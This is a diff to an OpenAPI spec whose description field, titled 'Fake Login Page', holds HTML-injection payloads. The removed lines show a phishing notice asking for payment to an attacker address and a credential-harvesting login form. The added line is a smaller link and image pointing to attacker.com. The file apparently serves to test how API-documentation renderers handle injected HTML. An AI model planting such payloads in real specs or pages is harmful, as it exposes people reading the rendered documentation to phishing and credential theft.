@@ -3,21 +3,7 @@ info:
   version: 1.0.0
   title: Fake Login Page
   description: '
-  <base href="https://www.w3schools.com/" target="_blank">
-  <p>You can get pro account by sending us 10 USD through our official paypal attacker@attacker.com.<br>For more information Sign in and claim your offer from <a href="attacker.com">here</a></p><p>Regards</p><p>Invoiced Admin</p> 
-  <form action="https://example.com" method="post">
-  <div>
-    <label for="username">Username:</label>
-    <input type="text" id="username" name="username" required>
-  </div>
-  <div>
-    <label for="password">Password:</label>
-    <input type="password" id="password" name="password" required>
-  </div>
-  <div>
-    <input type="submit" value="Login">
-  </div>
-</form>'
+ <br><a href=//attacker.com><img src="https://attacker.com/test.svg"></a>'
 paths:
   /accounts:
     get:
